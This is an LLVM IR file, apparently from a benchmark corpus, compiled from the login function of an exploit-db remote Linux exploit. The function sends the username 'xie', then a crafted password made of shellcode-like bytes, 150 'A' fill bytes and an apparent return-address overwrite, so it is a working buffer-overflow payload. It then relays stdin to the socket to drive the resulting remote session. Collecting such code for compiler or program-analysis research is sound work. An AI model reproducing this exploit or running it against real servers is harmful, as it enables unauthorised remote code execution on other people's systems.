; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_89.c_login.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_89.c_login.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.login.cx = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str = private unnamed_addr constant [7 x i8] c"xie\0D\0A\00\00", align 1
@.str.1 = private unnamed_addr constant [23 x i8] c"[*] sending username \0A\00", align 1
@.str.2 = private unnamed_addr constant [22 x i8] c"[*] sending password\0A\00", align 1
@.str.3 = private unnamed_addr constant [4 x i8] c"\0D\0A\00\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [36 x i8] c"Connection closed by foreign host.\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [3 x i8] c"%s\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @login(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca [1024 x i8], align 16
  %4 = alloca [172 x i8], align 16
  %5 = alloca [3 x i8], align 1
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %8 = bitcast [3 x i8]* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %8, i8* align 1 getelementptr inbounds ([3 x i8], [3 x i8]* @__const.login.cx, i32 0, i32 0), i64 3, i1 false)
  %9 = getelementptr inbounds [172 x i8], [172 x i8]* %4, i64 0, i64 0
  %10 = call i32 @memset(i8* %9, i8 signext 0, i32 172)
  store i32 0, i32* %6, align 4
  %11 = load i32, i32* %6, align 4
  %12 = add nsw i32 %11, 1
  store i32 %12, i32* %6, align 4
  %13 = sext i32 %11 to i64
  %14 = getelementptr inbounds [172 x i8], [172 x i8]* %4, i64 0, i64 %13
  store i8 104, i8* %14, align 1
  %15 = load i32, i32* %6, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %6, align 4
  %17 = sext i32 %15 to i64
  %18 = getelementptr inbounds [172 x i8], [172 x i8]* %4, i64 0, i64 %17
  store i8 48, i8* %18, align 1
  %19 = load i32, i32* %6, align 4
  %20 = add nsw i32 %19, 1
  store i32 %20, i32* %6, align 4
  %21 = sext i32 %19 to i64
  %22 = getelementptr inbounds [172 x i8], [172 x i8]* %4, i64 0, i64 %21
  store i8 -2, i8* %22, align 1
  %23 = load i32, i32* %6, align 4
  %24 = add nsw i32 %23, 1
  store i32 %24, i32* %6, align 4
  %25 = sext i32 %23 to i64
  %26 = getelementptr inbounds [172 x i8], [172 x i8]* %4, i64 0, i64 %25
  store i8 -1, i8* %26, align 1
  %27 = load i32, i32* %6, align 4
  %28 = add nsw i32 %27, 1
  store i32 %28, i32* %6, align 4
  %29 = sext i32 %27 to i64
  %30 = getelementptr inbounds [172 x i8], [172 x i8]* %4, i64 0, i64 %29
  store i8 -1, i8* %30, align 1
  %31 = load i32, i32* %6, align 4
  %32 = add nsw i32 %31, 1
  store i32 %32, i32* %6, align 4
  %33 = sext i32 %31 to i64
  %34 = getelementptr inbounds [172 x i8], [172 x i8]* %4, i64 0, i64 %33
  store i8 -1, i8* %34, align 1
  %35 = load i32, i32* %6, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %6, align 4
  %37 = sext i32 %35 to i64
  %38 = getelementptr inbounds [172 x i8], [172 x i8]* %4, i64 0, i64 %37
  store i8 -65, i8* %38, align 1
  %39 = load i32, i32* %6, align 4
  %40 = add nsw i32 %39, 1
  store i32 %40, i32* %6, align 4
  %41 = sext i32 %39 to i64
  %42 = getelementptr inbounds [172 x i8], [172 x i8]* %4, i64 0, i64 %41
  store i8 -65, i8* %42, align 1
  %43 = load i32, i32* %6, align 4
  %44 = add nsw i32 %43, 1
  store i32 %44, i32* %6, align 4
  %45 = sext i32 %43 to i64
  %46 = getelementptr inbounds [172 x i8], [172 x i8]* %4, i64 0, i64 %45
  store i8 -61, i8* %46, align 1
  %47 = getelementptr inbounds [172 x i8], [172 x i8]* %4, i64 0, i64 0
  %48 = load i32, i32* %6, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %47, i64 %49
  %51 = call i32 @memset(i8* %50, i8 signext 65, i32 150)
  %52 = load i32, i32* %6, align 4
  %53 = add nsw i32 %52, 150
  store i32 %53, i32* %6, align 4
  %54 = load i32, i32* %6, align 4
  %55 = add nsw i32 %54, 1
  store i32 %55, i32* %6, align 4
  %56 = sext i32 %54 to i64
  %57 = getelementptr inbounds [172 x i8], [172 x i8]* %4, i64 0, i64 %56
  store i8 -75, i8* %57, align 1
  %58 = load i32, i32* %6, align 4
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %6, align 4
  %60 = sext i32 %58 to i64
  %61 = getelementptr inbounds [172 x i8], [172 x i8]* %4, i64 0, i64 %60
  store i8 -44, i8* %61, align 1
  %62 = call i32 @sleep(i32 2)
  %63 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3, i64 0, i64 0
  %64 = call i32 @memset(i8* %63, i8 signext 0, i32 1024)
  %65 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3, i64 0, i64 0
  %66 = call i32 @strcpy(i8* %65, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))
  %67 = call i32 @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.1, i64 0, i64 0))
  %68 = load i32, i32* %2, align 4
  %69 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3, i64 0, i64 0
  %70 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3, i64 0, i64 0
  %71 = call i32 @strlen(i8* %70)
  %72 = call i32 @sendstr(i32 %68, i8* %69, i32 %71)
  %73 = call i32 @sleep(i32 1)
  %74 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.2, i64 0, i64 0))
  %75 = call i32 @sleep(i32 2)
  %76 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3, i64 0, i64 0
  %77 = call i32 @memset(i8* %76, i8 signext 0, i32 1024)
  %78 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3, i64 0, i64 0
  %79 = getelementptr inbounds [172 x i8], [172 x i8]* %4, i64 0, i64 0
  %80 = call i32 @strcpy(i8* %78, i8* %79)
  %81 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3, i64 0, i64 0
  %82 = call i32 @strcat(i8* %81, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.3, i64 0, i64 0))
  %83 = load i32, i32* %2, align 4
  %84 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3, i64 0, i64 0
  %85 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3, i64 0, i64 0
  %86 = call i32 @strlen(i8* %85)
  %87 = call i32 @sendstr(i32 %83, i8* %84, i32 %86)
  %88 = call i32 @sleep(i32 2)
  %89 = load i32, i32* @stdout, align 4
  %90 = call i32 @fflush(i32 %89)
  %91 = call i32 @FD_ZERO(i32* %7)
  br label %92

92:                                               ; preds = %1, %131
  %93 = load i32, i32* %2, align 4
  %94 = call i32 @FD_SET(i32 %93, i32* %7)
  %95 = call i32 @FD_SET(i32 0, i32* %7)
  %96 = load i32, i32* %2, align 4
  %97 = add nsw i32 %96, 1
  %98 = call i32 @select(i32 %97, i32* %7, i32 0, i32 0, i32 0)
  %99 = load i32, i32* %2, align 4
  %100 = call i64 @FD_ISSET(i32 %99, i32* %7)
  %101 = icmp ne i64 %100, 0
  br i1 %101, label %102, label %116

102:                                              ; preds = %92
  %103 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3, i64 0, i64 0
  %104 = call i32 @memset(i8* %103, i8 signext 0, i32 1024)
  %105 = load i32, i32* %2, align 4
  %106 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3, i64 0, i64 0
  %107 = call i32 @read(i32 %105, i8* %106, i32 1023)
  store i32 %107, i32* %6, align 4
  %108 = icmp eq i32 %107, 0
  br i1 %108, label %109, label %112

109:                                              ; preds = %102
  %110 = call i32 @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.4, i64 0, i64 0))
  %111 = call i32 @exit(i32 -1) #4
  unreachable

112:                                              ; preds = %102
  %113 = load i32, i32* @stderr, align 4
  %114 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3, i64 0, i64 0
  %115 = call i32 @fprintf(i32 %113, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i8* %114)
  br label %116

116:                                              ; preds = %112, %92
  %117 = call i64 @FD_ISSET(i32 0, i32* %7)
  %118 = icmp ne i64 %117, 0
  br i1 %118, label %119, label %131

119:                                              ; preds = %116
  %120 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3, i64 0, i64 0
  %121 = call i32 @memset(i8* %120, i8 signext 0, i32 1024)
  %122 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3, i64 0, i64 0
  %123 = call i32 @read(i32 0, i8* %122, i32 1023)
  store i32 %123, i32* %6, align 4
  %124 = icmp sgt i32 %123, 0
  br i1 %124, label %125, label %130

125:                                              ; preds = %119
  %126 = load i32, i32* %2, align 4
  %127 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3, i64 0, i64 0
  %128 = load i32, i32* %6, align 4
  %129 = call i32 @write(i32 %126, i8* %127, i32 %128)
  br label %130

130:                                              ; preds = %125, %119
  br label %131

131:                                              ; preds = %130, %116
  br label %92
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i32 @strcpy(i8*, i8*) #2

declare dso_local i32 @printf(i8*) #2

declare dso_local i32 @sendstr(i32, i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @strcat(i8*, i8*) #2

declare dso_local i32 @fflush(i32) #2

declare dso_local i32 @FD_ZERO(i32*) #2

declare dso_local i32 @FD_SET(i32, i32*) #2

declare dso_local i32 @select(i32, i32*, i32, i32, i32) #2

declare dso_local i64 @FD_ISSET(i32, i32*) #2

declare dso_local i32 @read(i32, i8*, i32) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @fprintf(i32, i8*, i8*) #2

declare dso_local i32 @write(i32, i8*, i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
